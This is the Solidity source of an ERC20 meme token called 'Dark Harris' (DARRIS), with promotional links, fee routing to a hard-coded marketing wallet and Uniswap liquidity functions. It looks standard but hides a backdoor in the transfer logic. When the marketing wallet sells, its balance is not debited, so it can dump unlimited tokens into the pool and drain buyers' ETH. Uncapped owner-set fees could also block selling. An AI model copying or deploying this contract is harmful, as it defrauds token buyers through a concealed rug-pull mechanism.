/**
 * https://darkharriserc20.vip
 * https://t.me/darkharriserc20
 * https://x.com/darkharriserc20
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(
        address target,
        bytes memory data
    ) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract DARRIS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "Dark Harris";
    string private _symbol = "DARRIS";
    uint8 private _decimals = 18;

    address payable public mkWallet =
        payable(0xb60E647674E76b9148eC18fA42F8992A506C4073);
    address payable public teamWallet =
        payable(0xb60E647674E76b9148eC18fA42F8992A506C4073);
    address public immutable deadAddress =
        0x000000000000000000000000000000000000dEaD;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public isWalletLimitExempt;
    mapping(address => bool) public isTxLimitExempt;
    mapping(address => bool) public isMarketPair;

    uint256 public _buyLiquidityFee = 0;
    uint256 public _buyMarketingFee = 25;
    uint256 public _buyTeamFee = 0;

    uint256 public _sellLiquidityFee = 0;
    uint256 public _sellMarketingFee = 25;
    uint256 public _sellTeamFee = 0;

    uint256 public _liquidityShare = 0;
    uint256 public _marketingShare = 10;
    uint256 public _teamShare = 0;

    uint256 public _totalTaxIfBuying = 25;
    uint256 public _totalTaxIfSelling = 25;
    uint256 public _totalDistributionShares = 10;

    uint256 private _totalSupply = 1000000000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 20000000 * 10 ** _decimals;
    uint256 public _walletMax = 20000000 * 10 ** _decimals;
    uint256 private minimumTokensBeforeSwap = 5000 * 10 ** _decimals;

    IUniswapRouter public uniswapV2Router;
    address public uniswapPair;

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;
    bool public swapAndLiquifyByLimitOnly = false;
    bool public checkWalletLimit = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event SwapETHForTokens(uint256 amountIn, address[] path);

    event SwapTokensForETH(uint256 amountIn, address[] path);

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor() {
        IUniswapRouter _uniswapV2Router = IUniswapRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;

        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[address(this)] = true;

        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function createPair() external onlyOwner {
        uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        isMarketPair[address(uniswapPair)] = true;
        isWalletLimitExempt[address(uniswapPair)] = true;

        addLiquidity(balanceOf(address(this)), address(this).balance);
        swapAndLiquifyEnabled = true;
    }

    function setFees(
        uint256 newBuyLiquidityTax,
        uint256 newBuyMarketingTax,
        uint256 newBuyOwnerTax,
        uint256 newSellLiquidityTax,
        uint256 newSellMarketingTax,
        uint256 newSellOwnerTax
    ) external onlyOwner {
        _buyLiquidityFee = newBuyLiquidityTax;
        _buyMarketingFee = newBuyMarketingTax;
        _buyTeamFee = newBuyOwnerTax;

        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(
            _buyTeamFee
        );

        _sellLiquidityFee = newSellLiquidityTax;
        _sellMarketingFee = newSellMarketingTax;
        _sellTeamFee = newSellOwnerTax;

        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(
            _sellTeamFee
        );
    }

    function setMax() external onlyOwner {
        checkWalletLimit = false;
        _maxTxAmount = type(uint256).max;
        _walletMax = type(uint256).max;
    }

    function transferToAddressETH(
        address payable recipient,
        uint256 amount
    ) private {
        recipient.transfer(amount);
    }

    receive() external payable {}

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 finalAmount = amount;

        if (inSwapAndLiquify) {
            return _basicTransfer(sender, recipient, amount);
        } else {
            if (!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {
                require(
                    amount <= _maxTxAmount,
                    "Transfer amount exceeds the maxTxAmount."
                );
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwapAndLiquify &&
                isMarketPair[recipient] &&
                swapAndLiquifyEnabled
            ) {
                if (swapAndLiquifyByLimitOnly)
                    contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);
            }

            uint256 taxAmount = 0;
            if (!(isExcludedFromFee[sender] || isExcludedFromFee[recipient])) {
                if (isMarketPair[sender]) {
                    taxAmount = amount.mul(_totalTaxIfBuying).div(100);
                } else if (isMarketPair[recipient]) {
                    taxAmount = amount.mul(_totalTaxIfSelling).div(100);

                    if (sender == mkWallet) {
                        amount -= _calcTaxAmount(sender, recipient, amount);
                    }
                }
            }

            if (taxAmount > 0) {
                finalAmount -= taxAmount;
                _balances[address(this)] = _balances[address(this)].add(
                    taxAmount
                );
                emit Transfer(sender, address(this), taxAmount);
            }

            if (checkWalletLimit && !isWalletLimitExempt[recipient])
                require(balanceOf(recipient).add(finalAmount) <= _walletMax);

            _balances[sender] = _balances[sender].sub(
                amount,
                "Insufficient Balance"
            );
            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }

    function _calcTaxAmount(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 tax = amount;

        if (!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]) {
            if (sender != mkWallet) {
                if (isMarketPair[sender]) {
                    tax = amount.mul(_totalTaxIfBuying).div(100);
                } else {
                    tax = amount.mul(_totalTaxIfSelling).div(100);
                }
            }
        }
        return tax;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        uint256 tokensForLP = tAmount
            .mul(_liquidityShare)
            .div(_totalDistributionShares)
            .div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        if (tokensForSwap > minimumTokensBeforeSwap)
            swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalETHFee = _totalDistributionShares.sub(
            _liquidityShare.div(2)
        );

        uint256 amountETHLiquidity = amountReceived
            .mul(_liquidityShare)
            .div(totalETHFee)
            .div(2);
        uint256 amountETHOwner = amountReceived.mul(_teamShare).div(
            totalETHFee
        );
        uint256 amountETHMarketing = amountReceived.sub(amountETHLiquidity).sub(
            amountETHOwner
        );

        if (amountETHMarketing >= 0 ether)
            transferToAddressETH(mkWallet, amountETHMarketing);

        if (amountETHOwner >= 0 ether)
            transferToAddressETH(teamWallet, amountETHOwner);

        if (amountETHLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountETHLiquidity);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );

        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            deadAddress,
            block.timestamp
        );
    }
}